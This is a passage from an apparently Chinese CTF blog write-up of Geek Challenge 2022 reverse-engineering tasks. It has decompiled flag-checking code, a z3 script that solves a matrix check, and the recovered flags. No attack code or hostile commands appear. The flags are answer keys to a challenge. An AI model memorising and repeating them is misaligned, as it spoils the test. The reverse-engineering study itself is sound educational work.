  v10<span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">253</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">920</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">189</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">45</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">46</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">965</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">393</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">409</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">499</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">159</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">335</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">765</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">53</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">603</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">54</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">187</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">468</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">595</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">57</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">543</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">964</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">585</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">921</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">61</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">151</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">62</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">175</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">63</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">682</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>l <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> m <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>m <span class="token punctuation">)</span>
        v5 <span class="token operator">+=</span> input<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> k <span class="token operator">+</span> m<span class="token punctuation">]</span> <span class="token operator">*</span> v10<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> l <span class="token operator">+</span> m<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//矩阵运算（线代摆了快一个月了，记不清是不是了）</span>
      v10<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> k <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">+</span> l<span class="token punctuation">]</span> <span class="token operator">=</span> v5<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>n <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> ii <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> ii <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>ii <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v10<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> n <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">+</span> ii<span class="token punctuation">]</span> <span class="token operator">!=</span> compare_data_origin<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> n <span class="token operator">+</span> ii<span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token comment">//比较数据</span>
      <span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Ohhhh, TRY HARD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v12<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Yeah you win! your math is so goooooood!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v12<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>题目也给了我们hiit使用<a class="link" target="_blank" rel="noopener" href="https://github.com/Z3Prover/z3">z3<i class="fas fa-external-link-alt"></i></a></p>
<p>于是写下如下脚本:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span><span class="token operator">*</span>
v10<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x000002AE</span><span class="token punctuation">,</span> <span class="token number">0x00000363</span><span class="token punctuation">,</span> <span class="token number">0x00000171</span><span class="token punctuation">,</span> <span class="token number">0x0000031B</span><span class="token punctuation">,</span> <span class="token number">0x000002F2</span><span class="token punctuation">,</span> <span class="token number">0x0000005D</span><span class="token punctuation">,</span> <span class="token number">0x0000008F</span><span class="token punctuation">,</span> <span class="token number">0x000001F5</span><span class="token punctuation">,</span> <span class="token number">0x000001A8</span><span class="token punctuation">,</span> <span class="token number">0x0000006B</span><span class="token punctuation">,</span> <span class="token number">0x00000371</span><span class="token punctuation">,</span> <span class="token number">0x000000A8</span><span class="token punctuation">,</span> <span class="token number">0x000000D8</span><span class="token punctuation">,</span> <span class="token number">0x00000332</span><span class="token punctuation">,</span> <span class="token number">0x0000002E</span><span class="token punctuation">,</span> <span class="token number">0x000001D8</span><span class="token punctuation">,</span> <span class="token number">0x00000330</span><span class="token punctuation">,</span> <span class="token number">0x0000039B</span><span class="token punctuation">,</span> <span class="token number">0x000003E3</span><span class="token punctuation">,</span> <span class="token number">0x0000031A</span><span class="token punctuation">,</span> <span class="token number">0x000001A3</span><span class="token punctuation">,</span> <span class="token number">0x000000F2</span><span class="token punctuation">,</span> <span class="token number">0x000001E9</span><span class="token punctuation">,</span> <span class="token number">0x000002C3</span><span class="token punctuation">,</span> <span class="token number">0x00000336</span><span class="token punctuation">,</span> <span class="token number">0x000001C8</span><span class="token punctuation">,</span> <span class="token number">0x00000190</span><span class="token punctuation">,</span> <span class="token number">0x000003E6</span><span class="token punctuation">,</span> <span class="token number">0x000002A8</span><span class="token punctuation">,</span> <span class="token number">0x0000038C</span><span class="token punctuation">,</span> <span class="token number">0x0000028F</span><span class="token punctuation">,</span> <span class="token number">0x000000DD</span><span class="token punctuation">,</span> <span class="token number">0x000001E6</span><span class="token punctuation">,</span> <span class="token number">0x000000B0</span><span class="token punctuation">,</span> <span class="token number">0x0000011C</span><span class="token punctuation">,</span> <span class="token number">0x00000188</span><span class="token punctuation">,</span> <span class="token number">0x00000316</span><span class="token punctuation">,</span> <span class="token number">0x0000014B</span><span class="token punctuation">,</span> <span class="token number">0x0000018E</span><span class="token punctuation">,</span> <span class="token number">0x0000029F</span><span class="token punctuation">,</span> <span class="token number">0x000002E0</span><span class="token punctuation">,</span> <span class="token number">0x0000022C</span><span class="token punctuation">,</span> <span class="token number">0x000000FD</span><span class="token punctuation">,</span> <span class="token number">0x00000398</span><span class="token punctuation">,</span> <span class="token number">0x000000BD</span><span class="token punctuation">,</span> <span class="token number">0x000000FF</span><span class="token punctuation">,</span> <span class="token number">0x000003C5</span><span class="token punctuation">,</span> <span class="token number">0x00000189</span><span class="token punctuation">,</span> <span class="token number">0x00000199</span><span class="token punctuation">,</span> <span class="token number">0x000001F3</span><span class="token punctuation">,</span> <span class="token number">0x0000009F</span><span class="token punctuation">,</span> <span class="token number">0x0000014F</span><span class="token punctuation">,</span> <span class="token number">0x000002FD</span><span class="token punctuation">,</span> <span class="token number">0x0000025B</span><span class="token punctuation">,</span> <span class="token number">0x000000BB</span><span class="token punctuation">,</span> <span class="token number">0x000001D4</span><span class="token punctuation">,</span> <span class="token number">0x00000253</span><span class="token punctuation">,</span> <span class="token number">0x0000021F</span><span class="token punctuation">,</span> <span class="token number">0x000003C4</span><span class="token punctuation">,</span> <span class="token number">0x00000249</span><span class="token punctuation">,</span> <span class="token number">0x00000399</span><span class="token punctuation">,</span> <span class="token number">0x00000097</span><span class="token punctuation">,</span> <span class="token number">0x000000AF</span><span class="token punctuation">,</span><span class="token number">0x000002AA</span><span class="token punctuation">]</span>
com_data<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x000668C4</span><span class="token punctuation">,</span> <span class="token number">0x000478D6</span><span class="token punctuation">,</span> <span class="token number">0x0007EE74</span><span class="token punctuation">,</span> <span class="token number">0x000818B9</span><span class="token punctuation">,</span> <span class="token number">0x00058F7B</span><span class="token punctuation">,</span> <span class="token number">0x0006C4D1</span><span class="token punctuation">,</span> <span class="token number">0x00055CC5</span><span class="token punctuation">,</span> <span class="token number">0x0006CC96</span><span class="token punctuation">,</span> <span class="token number">0x00063F02</span><span class="token punctuation">,</span> <span class="token number">0x0005042A</span><span class="token punctuation">,</span> <span class="token number">0x000833EE</span><span class="token punctuation">,</span> <span class="token number">0x00079B74</span><span class="token punctuation">,</span> <span class="token number">0x0005267E</span><span class="token punctuation">,</span> <span class="token number">0x00064AD3</span><span class="token punctuation">,</span> <span class="token number">0x000536BE</span><span class="token punctuation">,</span> <span class="token number">0x0006C9AE</span><span class="token punctuation">,</span> <span class="token number">0x00063FCC</span><span class="token punctuation">,</span> <span class="token number">0x00042C21</span><span class="token punctuation">,</span> <span class="token number">0x00080303</span><span class="token punctuation">,</span> <span class="token number">0x000748E0</span><span class="token punctuation">,</span> <span class="token number">0x00050A29</span><span class="token punctuation">,</span> <span class="token number">0x00068311</span><span class="token punctuation">,</span> <span class="token number">0x0004CDFB</span><span class="token punctuation">,</span> <span class="token number">0x0006A352</span><span class="token punctuation">,</span> <span class="token number">0x0005FDAF</span><span class="token punctuation">,</span> <span class="token number">0x0004923B</span><span class="token punctuation">,</span> <span class="token number">0x0007DDDF</span><span class="token punctuation">,</span> <span class="token number">0x0007CB34</span><span class="token punctuation">,</span> <span class="token number">0x0004E73D</span><span class="token punctuation">,</span> <span class="token number">0x00067B28</span><span class="token punctuation">,</span> <span class="token number">0x0004EA41</span><span class="token punctuation">,</span> <span class="token number">0x000678B8</span><span class="token punctuation">,</span> <span class="token number">0x00060A63</span><span class="token punctuation">,</span> <span class="token number">0x00048AD0</span><span class="token punctuation">,</span> <span class="token number">0x00077A42</span><span class="token punctuation">,</span> <span class="token number">0x0007A6A5</span><span class="token punctuation">,</span> <span class="token number">0x000569BF</span><span class="token punctuation">,</span> <span class="token number">0x000620AC</span><span class="token punctuation">,</span> <span class="token number">0x00054FE7</span><span class="token punctuation">,</span> <span class="token number">0x00068FCF</span><span class="token punctuation">,</span> <span class="token number">0x00061ECF</span><span class="token punctuation">,</span> <span class="token number">0x0004AECA</span><span class="token punctuation">,</span> <span class="token number">0x0007F887</span><span class="token punctuation">,</span> <span class="token number">0x0007C314</span><span class="token punctuation">,</span> <span class="token number">0x00052326</span><span class="token punctuation">,</span> <span class="token number">0x00065AB5</span><span class="token punctuation">,</span> <span class="token number">0x0004F2EA</span><span class="token punctuation">,</span> <span class="token number">0x0006E532</span><span class="token punctuation">,</span> <span class="token number">0x000666B0</span><span class="token punctuation">,</span> <span class="token number">0x0004EE2D</span><span class="token punctuation">,</span> <span class="token number">0x00084910</span><span class="token punctuation">,</span> <span class="token number">0x00080EA2</span><span class="token punctuation">,</span> <span class="token number">0x000577D7</span><span class="token punctuation">,</span> <span class="token number">0x0006A40A</span><span class="token punctuation">,</span> <span class="token number">0x00056816</span><span class="token punctuation">,</span> <span class="token number">0x00070B30</span><span class="token punctuation">,</span> <span class="token number">0x00055A67</span><span class="token punctuation">,</span> <span class="token number">0x00046F77</span><span class="token punctuation">,</span> <span class="token number">0x00071E75</span><span class="token punctuation">,</span> <span class="token number">0x0006F907</span><span class="token punctuation">,</span> <span class="token number">0x0004EEC8</span><span class="token punctuation">,</span> <span class="token number">0x0005E1E0</span><span class="token punctuation">,</span> <span class="token number">0x0004C135</span><span class="token punctuation">,</span> <span class="token number">0x0005F548</span><span class="token punctuation">]</span>
s<span class="token operator">=</span>Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>
a<span class="token operator">=</span><span class="token punctuation">[</span>Int<span class="token punctuation">(</span><span class="token string">"flag%d"</span><span class="token operator">%</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        v5<span class="token operator">=</span><span class="token number">0</span>
        <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            v5<span class="token operator">+=</span>a<span class="token punctuation">[</span><span class="token number">8</span><span class="token operator">*</span>k<span class="token operator">+</span>m<span class="token punctuation">]</span><span class="token operator">*</span>v10<span class="token punctuation">[</span><span class="token number">8</span><span class="token operator">*</span>l<span class="token operator">+</span>m<span class="token punctuation">]</span>
        s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>com_data<span class="token punctuation">[</span><span class="token number">8</span><span class="token operator">*</span>k<span class="token operator">+</span>l<span class="token punctuation">]</span><span class="token operator">==</span>v5<span class="token punctuation">)</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>sat<span class="token punctuation">)</span><span class="token punctuation">:</span>
    m<span class="token operator">=</span>s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>
    flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122131315393.png" alt="image-20221122131315393"></p>
<p><strong>flag：SYC{mltmixbOHyUqdpWaRDoeRleiRqtBhVBLutfgLXvqgblJQmdbewrfDPIPIun}</strong></p>
<h3 id="HelloBinary"><a href="#HelloBinary" class="headerlink" title="HelloBinary"></a>HelloBinary</h3><p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221121230645195.png" alt="image-20221121230645195"></p>
<p>这题拖进ida里面选择以二进制文件打开：<img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221121231049542.png" alt="image-20221121231049542"></p>
<p>可以看到：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221121231133007.png" alt="image-20221121231133007"></p>
<p>或者按shift +f12 打开字符串的窗口可以直接看到：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221121231317168.png" alt="image-20221121231317168"></p>
<p>用010editor也可：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221121231440685.png" alt="image-20221121231440685"></p>
<p>flag：SYC{E#t4r_th4_dOo2_o&amp;_&gt;h4_Rev4rseWorLd}</p>
<h3 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h3><p>查壳:</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122131521888.png" alt="image-20221122131521888"></p>
<p>这个题整理一下，大致代码如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_401D60</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>input<span class="token punctuation">;</span> <span class="token comment">// r15</span>
  <span class="token keyword">unsigned</span> __int64 len_add1<span class="token punctuation">;</span> <span class="token comment">// kr08_8</span>
  <span class="token keyword">signed</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rsp</span>
  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// r14</span>
  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// r12</span>
  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-E8h]</span>
  _DWORD v11<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-E0h] BYREF</span>
  __int64 v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-D8h]</span>
  <span class="token keyword">int</span> v13<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-D0h]</span>
  <span class="token keyword">unsigned</span> __int64 v14<span class="token punctuation">;</span> <span class="token comment">// [rsp+B0h] [rbp-38h]</span>

  v14 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  input <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">38LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to Geek Challenge 2022"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"please input your flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> input<span class="token punctuation">)</span><span class="token punctuation">;</span>
  len_add1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> v11 <span class="token operator">!=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v11 <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>len_add1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFF000LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>len_add1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF0</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">alloca</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>len_add1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>__int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v10 <span class="token operator">+</span> v2<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>__int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v10 <span class="token operator">+</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">59</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">68</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">74</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">19</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">118</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">219</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">83</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">43</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">47</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">104</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">63</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">27</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">222</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">63</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">72</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">53</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">114</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">63</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">219</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">204</span><span class="token punctuation">;</span>
  v13<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">117</span><span class="token punctuation">;</span>
